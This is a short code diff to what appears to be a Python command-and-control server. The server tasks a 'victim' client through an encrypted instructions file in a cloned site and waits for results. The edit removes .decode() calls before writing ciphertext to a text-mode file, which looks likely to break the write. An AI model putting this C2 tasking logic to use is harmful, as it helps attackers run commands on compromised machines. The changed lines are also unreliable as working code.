@@ -201,7 +201,7 @@ class SPQ(tornado.web.RequestHandler):
 
         with open("clone_site/instructions.txt", "w") as fh:
             no_instructions = cipher.encrypt("nothing".encode())
-            fh.write(no_instructions.decode())
+            fh.write(no_instructions)
 
 def main_c2():
     """Start C2 Server."""
@@ -277,7 +277,7 @@ if __name__ == "__main__":
     # here we say no instructions to the client
     with open("clone_site/instructions.txt", "w") as fh:
         no_instructions = cipher.encrypt("nothing".encode())
-        fh.write(no_instructions.decode())
+        fh.write(no_instructions)
 
     print("[*] Next, enter the command you want the victim to execute.")
     print("[*] Client uses random intervals, this may take a few.")
@@ -291,7 +291,7 @@ if __name__ == "__main__":
                 sys.exit("Not sure I support this version of Python.")
             task_out = cipher.encrypt(task.encode())
             with open("clone_site/instructions.txt", "w") as fh:
-                fh.write(task_out.decode())
+                fh.write(task_out)
             print("[*] Waiting for command to be executed, be patient, results will be displayed here...")
             while 1:
                 # we received a hit with our command
